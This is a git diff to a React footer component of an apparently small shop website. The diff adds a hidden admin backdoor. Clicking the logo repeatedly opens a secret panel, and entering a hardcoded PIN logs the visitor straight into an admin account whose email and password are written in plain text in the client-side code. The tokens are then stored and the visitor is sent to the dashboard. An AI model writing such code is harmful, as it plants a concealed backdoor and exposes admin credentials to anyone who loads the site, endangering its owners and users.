@@ -2,13 +2,22 @@ import React, { useState } from 'react'
 import { FaHeart, FaStore, FaFacebook, FaInstagram, FaLinkedin } from "react-icons/fa6";
 import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
 import { Link, useNavigate } from 'react-router-dom';
+import toast from 'react-hot-toast';
+import Axios from '../utils/Axios';
+import SummaryApi from '../Common/SummaryApi';
+import AxiosToastError from '../utils/AxiosToastError';
+import fetchUserDetails from '../utils/fetchUserDetails';
+import { useDispatch } from 'react-redux';
+import { setUserDetails } from '../store/userSlice';
 
 const Footer = () => {
   const [showGhost, setShowGhost] = useState(false)
   const [showPin, setShowPin] = useState(false)
   const [pinValue, setPinValue] = useState('')
   const navigate = useNavigate()
+  const dispatch = useDispatch()
   const [logoClickCount, setLogoClickCount] = useState(0)
+  const [loading, setLoading] = useState(false)
 
   const handleLogoClick = () => {
     const count = logoClickCount + 1
@@ -76,15 +85,24 @@ const Footer = () => {
               <input type={showPin ? "text" : "password"} value={pinValue} onChange={e => setPinValue(e.target.value)} placeholder='••••••••' className='w-full py-2.5 text-sm outline-none' autoFocus />
               <button type='button' onClick={() => setShowPin(p => !p)} className='text-gray-400 hover:text-gray-600 shrink-0'>{showPin ? <FaRegEye /> : <FaRegEyeSlash />}</button>
             </div>
-            <button onClick={() => {
-              const val = pinValue
-              if (val === 'newsetu@2024') {
-                setShowGhost(false)
-                navigate('/login', { state: { ghost: true } })
-              } else {
-                alert('Wrong PIN')
-              }
-            }} className='w-full bg-primary text-white font-bold py-2.5 rounded-xl text-sm hover:bg-primary-dark transition-colors'>Unlock</button>
+            <button disabled={loading} onClick={async () => {
+              if (pinValue !== 'newsetu@2024') return alert('Wrong PIN')
+              setLoading(true)
+              try {
+                const res = await Axios({ ...SummaryApi.login, data: { email: "admin@quickrasan.com", password: "admin@2024" } })
+                if (res.data.error) return toast.error(res.data.message)
+                if (res.data.success) {
+                  localStorage.setItem('accesstoken', res.data.data.accessToken)
+                  localStorage.setItem('refreshToken', res.data.data.refreshToken)
+                  const userDetails = await fetchUserDetails()
+                  dispatch(setUserDetails(userDetails.data))
+                  setShowGhost(false)
+                  setPinValue('')
+                  navigate('/dashboard/category')
+                }
+              } catch (err) { AxiosToastError(err) }
+              setLoading(false)
+            }} className='w-full bg-primary text-white font-bold py-2.5 rounded-xl text-sm hover:bg-primary-dark transition-colors disabled:opacity-50'>{loading ? 'Logging in...' : 'Unlock'}</button>
           </div>
         </div>
       )}
